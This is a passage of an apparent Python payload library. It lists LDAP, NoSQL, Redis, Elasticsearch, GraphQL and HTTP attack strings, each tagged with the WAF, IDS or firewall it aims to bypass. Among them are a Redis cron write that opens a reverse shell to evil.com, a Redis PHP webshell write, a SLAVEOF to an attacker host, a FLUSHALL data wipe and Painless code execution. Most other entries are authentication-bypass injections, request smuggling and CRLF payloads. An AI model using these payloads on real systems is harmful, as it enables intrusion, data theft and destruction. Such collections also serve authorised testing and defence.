        'ldap_anonymous_bind': {
            'payload': '',
            'description': 'LDAP anonymous bind test (empty credentials)',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'high'
        },
        'ldap_group_membership': {
            'payload': '(&(objectClass=group)(member=CN=Domain Admins,CN=Users,DC=domain,DC=com))',
            'description': 'LDAP group membership reverse lookup',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_root_dse': {
            'payload': '(supportedLDAPVersion=*)',
            'description': 'LDAP rootDSE supported versions',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'ldap_auth_or_bypass_v2': {
            'payload': 'x)(|(password=*',
            'description': 'LDAP authentication OR bypass v2',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'ldap_scope_subtree': {
            'payload': '(objectClass=organizationalPerson)',
            'description': 'LDAP subtree scope for all persons',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'ldap_time_based_exists': {
            'payload': '(&(cn=admin)(|(description=a*)(description=b*)(description=c*)(description=d*)(description=e*)(description=f*)))',
            'description': 'LDAP time-based enumeration via description attribute',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'medium'
        },
        'ldap_ad_computer': {
            'payload': '(objectCategory=computer)',
            'description': 'LDAP AD computer objects enumeration',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'ldap_userpassword_clear': {
            'payload': '(userPassword=admin)',
            'description': 'LDAP cleartext password comparison',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'ldap_or_inject_v3': {
            'payload': '(|(cn=*)(userPassword=*))',
            'description': 'LDAP OR query all users with password attribute',
            'category': PayloadCategory.LDAP,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        }
    }

    # NoSQL Injection Payloads
    NOSQL_PAYLOADS = {
        # MongoDB operator injection
        'nosql_mongo_ne': {
            'payload': '{"$ne": null}',
            'description': 'MongoDB $ne operator bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'nosql_mongo_ne_string': {
            'payload': '{"$ne": "invalid"}',
            'description': 'MongoDB $ne with string value',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'nosql_mongo_gt': {
            'payload': '{"$gt": ""}',
            'description': 'MongoDB $gt empty string bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'nosql_mongo_gt_null': {
            'payload': '{"$gt": null}',
            'description': 'MongoDB $gt null bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'nosql_mongo_gte': {
            'payload': '{"$gte": ""}',
            'description': 'MongoDB $gte operator bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'nosql_mongo_regex': {
            'payload': '{"$regex": ".*"}',
            'description': 'MongoDB $regex match all',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_regex_admin': {
            'payload': '{"$regex": "^admin"}',
            'description': 'MongoDB $regex prefix match',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_in': {
            'payload': '{"$in": ["admin", "root", "test"]}',
            'description': 'MongoDB $in operator enumeration',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'nosql_mongo_exists_true': {
            'payload': '{"$exists": true}',
            'description': 'MongoDB $exists true - field must exist',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_mongo_or': {
            'payload': '{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}',
            'description': 'MongoDB $or operator bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        # JavaScript injection (MongoDB)
        'nosql_mongo_where': {
            'payload': '{"$where": "return true"}',
            'description': 'MongoDB $where JS injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_where_sleep': {
            'payload': '{"$where": "sleep(5000) || true"}',
            'description': 'MongoDB $where time-based blind',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_where_exfil': {
            'payload': '{"$where": "this.password.match(/^a/)"}',
            'description': 'MongoDB $where blind extraction',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_mapreduce': {
            'payload': '{"$where": "function() { return true; }"}',
            'description': 'MongoDB $where function injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # PHP/HTTP parameter injection
        'nosql_php_array': {
            'payload': 'username[$ne]=invalid&password[$ne]=invalid',
            'description': 'PHP array syntax NoSQL injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_php_gt': {
            'payload': 'username[$gt]=&password[$gt]=',
            'description': 'PHP array $gt bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_php_regex': {
            'payload': 'username[$regex]=.*&password[$regex]=.*',
            'description': 'PHP array $regex match all',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_php_where': {
            'payload': '[$where]=function(){return true}',
            'description': 'PHP $where injection in query param',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # CouchDB
        'nosql_couchdb_view': {
            'payload': '{"map": "function(doc) { emit(doc._id, doc) }"}',
            'description': 'CouchDB view injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_couchdb_all_docs': {
            'payload': '/_all_docs',
            'description': 'CouchDB all documents endpoint',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_couchdb_config': {
            'payload': '/_config',
            'description': 'CouchDB configuration endpoint',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Redis injection
        'nosql_redis_info': {
            'payload': '\r\nINFO\r\n',
            'description': 'Redis CRLF injection for INFO command',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_redis_config_get': {
            'payload': '\r\nCONFIG GET *\r\n',
            'description': 'Redis CONFIG GET via injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_redis_keys': {
            'payload': '\r\nKEYS *\r\n',
            'description': 'Redis KEYS * enumeration',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_redis_flushall': {
            'payload': '\r\nFLUSHALL\r\n',
            'description': 'Redis FLUSHALL via injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_redis_set_cron': {
            'payload': '\r\nCONFIG SET dir /var/spool/cron/\r\nCONFIG SET dbfilename root\r\nSET x "\\n*/1 * * * * bash -i>&/dev/tcp/evil.com/4444 0>&1\\n"\r\nSAVE\r\n',
            'description': 'Redis RCE via cron job write',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        # Elasticsearch
        'nosql_elastic_query': {
            'payload': '{"query": {"match_all": {}}}',
            'description': 'Elasticsearch match all documents',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_elastic_script': {
            'payload': '{"query": {"script": {"script": "doc[\'role\'].value == \'admin\'"}}}',
            'description': 'Elasticsearch script query injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_elastic_painless_rce': {
            'payload': '{"script": {"lang": "painless", "source": "Runtime rt = Runtime.getRuntime(); rt.exec(\'id\')"}}',
            'description': 'Elasticsearch Painless script RCE (old versions)',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # JSON injection
        'nosql_json_comment': {
            'payload': '{"username": "admin", /*comment*/ "role": "admin"}',
            'description': 'JSON comment injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_json_extra_field': {
            'payload': '{"username": "admin", "password": "x", "role": "admin"}',
            'description': 'JSON extra field injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_json_type_confusion': {
            'payload': '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            'description': 'JSON type confusion NoSQL injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # DynamoDB
        'nosql_dynamodb_scan': {
            'payload': '{"TableName": "users", "FilterExpression": "#n = :v", "ExpressionAttributeNames": {"#n": "username"}, "ExpressionAttributeValues": {":v": {"S": "admin"}}}',
            'description': 'DynamoDB scan for admin user',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # MongoDB aggregate
        'nosql_mongo_aggregate_lookup': {
            'payload': '[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "joined"}}, {"$project": {"password": 1}}]',
            'description': 'MongoDB aggregation lookup for joins',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_mongo_aggregate_project': {
            'payload': '[{"$match": {}}, {"$project": {"password": 1, "username": 1}}]',
            'description': 'MongoDB aggregation extract all passwords',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Prototype pollution (JSON-based NoSQL)
        'nosql_proto_pollution': {
            'payload': '{"__proto__": {"admin": true}}',
            'description': 'Prototype pollution via JSON body',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_proto_constructor': {
            'payload': '{"constructor": {"prototype": {"admin": true}}}',
            'description': 'Prototype pollution via constructor key',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_proto_flatten': {
            'payload': '{"a.b": {"__proto__": {"admin": true}}}',
            'description': 'Prototype pollution via flattened key',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # MongoDB geospatial injection
        'nosql_mongo_near': {
            'payload': '{"$near": {"$geometry": {"type": "Point", "coordinates": [0, 0]}}}',
            'description': 'MongoDB geospatial $near injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Time-based attacks
        'nosql_mongo_sleep_where': {
            'payload': 'username=admin&password[$where]=sleep(5000)',
            'description': 'MongoDB time-based blind via $where',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # MongoDB array operators
        'nosql_mongo_all': {
            'payload': '{"$all": [""]}',
            'description': 'MongoDB $all operator match',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_mongo_size': {
            'payload': '{"$size": {"$gt": -1}}',
            'description': 'MongoDB $size operator bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # GraphQL injection (NoSQL-adjacent)
        'nosql_graphql_introspection': {
            'payload': '{"query": "{__schema{types{name}}}"}',
            'description': 'GraphQL schema introspection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'nosql_graphql_batching': {
            'payload': '[{"query": "{user(id:1){password}}"}, {"query": "{user(id:2){password}}"}]',
            'description': 'GraphQL query batching attack',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'high'
        },
        'nosql_graphql_mutation': {
            'payload': '{"query": "mutation { createUser(username: \\"admin\\" password: \\"pwned\\" role: \\"admin\\") { id } }"}',
            'description': 'GraphQL privilege escalation via mutation',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Mongoose-specific
        'nosql_mongoose_cast': {
            'payload': '{"password": {"$gt": 0}}',
            'description': 'Mongoose type cast bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_mongoose_type_bool': {
            'payload': '{"active": "true"}',
            'description': 'Mongoose boolean string coercion',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Firebase
        'nosql_firebase_auth_bypass': {
            'payload': '{"email": "admin@target.com", "returnSecureToken": true}',
            'description': 'Firebase auth bypass attempt',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'high'
        },
        'nosql_firebase_rest': {
            'payload': '/.json?shallow=true',
            'description': 'Firebase REST API shallow read',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Cassandra
        'nosql_cassandra_cql_inject': {
            'payload': "' OR '1'='1",
            'description': 'Cassandra CQL injection (SQL-like syntax)',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # HBase
        'nosql_hbase_scan': {
            'payload': '{"type": "Put", "row": "\\x00admin", "column": "cf:password", "value": "hacked"}',
            'description': 'HBase REST API injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # MongoDB additional operators
        'nosql_mongo_lt': {
            'payload': '{"$lt": "z"}',
            'description': 'MongoDB $lt less than bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'nosql_mongo_lte': {
            'payload': '{"$lte": "z"}',
            'description': 'MongoDB $lte less than or equal bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'nosql_mongo_not': {
            'payload': '{"$not": {"$eq": "x"}}',
            'description': 'MongoDB $not operator bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_mongo_nor': {
            'payload': '{"$nor": [{"username": "x"}, {"username": "y"}]}',
            'description': 'MongoDB $nor operator - matches neither',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_mongo_type': {
            'payload': '{"$type": 2}',
            'description': 'MongoDB $type operator (2=string)',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'nosql_mongo_mod': {
            'payload': '{"$mod": [2, 0]}',
            'description': 'MongoDB $mod modulo operator bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'nosql_mongo_text_search': {
            'payload': '{"$text": {"$search": "admin"}}',
            'description': 'MongoDB full-text search injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'nosql_mongo_elemMatch': {
            'payload': '{"$elemMatch": {"$gt": ""}}',
            'description': 'MongoDB $elemMatch array operator bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_mongo_where_this': {
            'payload': '{"$where": "this.username == this.password"}',
            'description': 'MongoDB $where comparing two fields',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_where_hex': {
            'payload': '{"$where": "\\x74\\x68\\x69\\x73\\x2e\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64 == \'admin\'"}',
            'description': 'MongoDB $where with hex-encoded string',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_expr': {
            'payload': '{"$expr": {"$eq": ["$password", "$username"]}}',
            'description': 'MongoDB $expr comparison of two fields',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_mongo_js_function': {
            'payload': '{"$where": "function() { return true; }"}',
            'description': 'MongoDB $where with anonymous function',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_mongo_comment': {
            'payload': '{"username": "admin", "$comment": "test"}',
            'description': 'MongoDB $comment field injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'nosql_mongo_bit_and': {
            'payload': '{"$bitsAnySet": 1}',
            'description': 'MongoDB bitwise operator query',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'nosql_mongo_geo_within': {
            'payload': '{"$geoWithin": {"$centerSphere": [[0, 0], 1000]}}',
            'description': 'MongoDB geospatial $geoWithin injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Couchbase N1QL
        'nosql_couchbase_n1ql': {
            'payload': "' OR 1=1--",
            'description': 'Couchbase N1QL SQL-like injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_couchbase_meta': {
            'payload': "' UNION SELECT META().id FROM `bucket` --",
            'description': 'Couchbase N1QL meta() injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Redis Lua injection
        'nosql_redis_eval': {
            'payload': '\r\nEVAL "return redis.call(\'info\')" 0\r\n',
            'description': 'Redis EVAL Lua script injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_redis_slaveof': {
            'payload': '\r\nSLAVEOF evil.com 6379\r\n',
            'description': 'Redis SLAVEOF for data replication attack',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'nosql_redis_config_set_dir': {
            'payload': '\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET x "<?php system($_GET[cmd]); ?>"\r\nSAVE\r\n',
            'description': 'Redis RCE via webshell write',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'nosql_redis_getdump': {
            'payload': '\r\nDEBUG SLEEP 0\r\nCONFIG RESETSTAT\r\nOBJECT HELP\r\n',
            'description': 'Redis debug commands via injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Elasticsearch additional
        'nosql_elastic_range': {
            'payload': '{"query": {"range": {"age": {"gte": 0}}}}',
            'description': 'Elasticsearch range query injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'nosql_elastic_wildcard': {
            'payload': '{"query": {"wildcard": {"username": "*"}}}',
            'description': 'Elasticsearch wildcard query all users',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_elastic_terms': {
            'payload': '{"query": {"terms": {"role": ["admin", "root", "superuser"]}}}',
            'description': 'Elasticsearch terms query for role enum',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Neo4j Cypher injection
        'nosql_cypher_inject': {
            'payload': "' OR 1=1//",
            'description': 'Neo4j Cypher query injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_cypher_union': {
            'payload': "' UNION MATCH (n) RETURN n//",
            'description': 'Neo4j Cypher UNION to return all nodes',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # More PHP array / URL injections
        'nosql_php_nin': {
            'payload': 'username[$nin][]=invalid',
            'description': 'PHP array $nin (not in) bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_php_exists': {
            'payload': 'username[$exists]=true',
            'description': 'PHP array $exists operator',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_php_type': {
            'payload': 'username[$type]=2',
            'description': 'PHP array $type operator match strings',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Prototype pollution advanced
        'nosql_proto_deep_merge': {
            'payload': '{"a": {"__proto__": {"polluted": "true"}}}',
            'description': 'Prototype pollution via deep merge',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_proto_url_encoded': {
            'payload': '__proto__[isAdmin]=true&__proto__[role]=admin',
            'description': 'Prototype pollution via URL-encoded form data',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_proto_json_path': {
            'payload': '{"__proto__.isAdmin": true}',
            'description': 'Prototype pollution via dot notation JSON key',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # DynamoDB additional
        'nosql_dynamodb_condition': {
            'payload': '{"ConditionExpression": "attribute_exists(userId)"}',
            'description': 'DynamoDB condition expression injection',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # GraphQL additional
        'nosql_graphql_field_suggest': {
            'payload': '{"query": "{__type(name: \\"User\\"){fields{name}}}"}',
            'description': 'GraphQL field introspection for User type',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'nosql_graphql_nosql_filter': {
            'payload': '{"query": "{users(filter: {password: {_ne: \\"\\"}}){id username password}}"}',
            'description': 'GraphQL Hasura-style _ne filter bypass',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_mongo_aggregate_group': {
            'payload': '[{"$group": {"_id": "$password", "count": {"$sum": 1}}}]',
            'description': 'MongoDB aggregation group by password',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'nosql_mongo_aggregate_unwind': {
            'payload': '[{"$unwind": "$roles"}, {"$match": {"roles": "admin"}}]',
            'description': 'MongoDB aggregation unwind roles array',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'nosql_mongo_server_side_js': {
            'payload': '{"$where": "var date = new Date(); while(new Date()-date<5000){} return true;"}',
            'description': 'MongoDB server-side JS time delay',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'nosql_mongo_string_regex_all': {
            'payload': '{"username": {"$regex": "^", "$options": "i"}}',
            'description': 'MongoDB regex match beginning of any string',
            'category': PayloadCategory.NOSQL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        }
    }

    # General Bypass Payloads
    GENERAL_PAYLOADS = {
        # HTTP Header Injection
        'general_header_inject_cr': {
            'payload': 'value\r\nX-Injected: evil',
            'description': 'HTTP header injection via CRLF',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_header_inject_lf': {
            'payload': 'value\nX-Injected: evil',
            'description': 'HTTP header injection via LF',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_header_host_inject': {
            'payload': 'evil.com\r\nX-Forwarded-Host: evil.com',
            'description': 'Host header injection',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # CRLF injection
        'general_crlf_response_split': {
            'payload': '%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a',
            'description': 'HTTP response splitting via CRLF',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'general_crlf_set_cookie': {
            'payload': '%0d%0aSet-Cookie: session=evil; HttpOnly',
            'description': 'Cookie injection via CRLF',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_crlf_xss': {
            'payload': '%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>',
            'description': 'CRLF injection leading to XSS',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # Open redirect
        'general_open_redirect_double_slash': {
            'payload': '//evil.com',
            'description': 'Open redirect via double slash',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_open_redirect_backslash': {
            'payload': '\\\\evil.com',
            'description': 'Open redirect via backslash',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_open_redirect_protocol': {
            'payload': 'https://evil.com',
            'description': 'Open redirect to HTTPS',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_open_redirect_slash_encoded': {
            'payload': '/%2F/evil.com',
            'description': 'Open redirect with encoded slash',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'general_open_redirect_at': {
            'payload': 'https://target.com@evil.com',
            'description': 'Open redirect via @ in URL',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # CORS bypass
        'general_cors_null_origin': {
            'payload': 'Origin: null',
            'description': 'CORS null origin bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_cors_subdomain': {
            'payload': 'Origin: https://evil.target.com',
            'description': 'CORS subdomain bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_cors_postfix': {
            'payload': 'Origin: https://target.com.evil.com',
            'description': 'CORS domain postfix bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'general_cors_special_chars': {
            'payload': 'Origin: https://target.com_evil.com',
            'description': 'CORS special char bypass',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        # Cache poisoning
        'general_cache_poison_host': {
            'payload': 'X-Forwarded-Host: evil.com',
            'description': 'Web cache poisoning via X-Forwarded-Host',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'general_cache_poison_port': {
            'payload': 'X-Forwarded-Port: 1337',
            'description': 'Cache poisoning via X-Forwarded-Port',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'general_cache_poison_scheme': {
            'payload': 'X-Forwarded-Scheme: evil://evil.com',
            'description': 'Cache poisoning via X-Forwarded-Scheme',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # HTTP Request Smuggling
        'general_smuggling_cl_te': {
            'payload': 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin',
            'description': 'HTTP request smuggling CL.TE',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'general_smuggling_te_cl': {
            'payload': 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\ne\r\nGET /admin\r\n\r\n0\r\n\r\n',
            'description': 'HTTP request smuggling TE.CL',
            'category': PayloadCategory.GENERAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'general_smuggling_te_te': {
